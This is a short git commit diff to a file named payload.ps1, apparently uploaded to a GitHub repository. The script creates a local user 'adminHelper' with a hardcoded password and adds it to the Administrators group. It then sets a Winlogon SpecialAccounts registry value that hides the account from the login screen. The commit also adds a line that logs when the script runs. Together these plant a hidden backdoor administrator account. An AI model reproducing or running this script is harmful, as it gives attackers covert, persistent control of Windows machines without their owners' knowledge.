916a263b055f6ee9039776a460ee7100b1467483
Cuellarg07 <148662827+Cuellarg07@users.noreply.github.com>
2025-05-04 22:54:35 -0500

    Add files via upload

--- payload.ps1
+++ payload.ps1
@@ -1,3 +1,4 @@
+Add-Content C:\Users\Public\payload_log.txt "Script executed at: $(Get-Date)"
 net user adminHelper P@ssw0rd123! /add
 net localgroup Administrators adminHelper /add
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v adminHelper /t REG_DWORD /d 0 /f
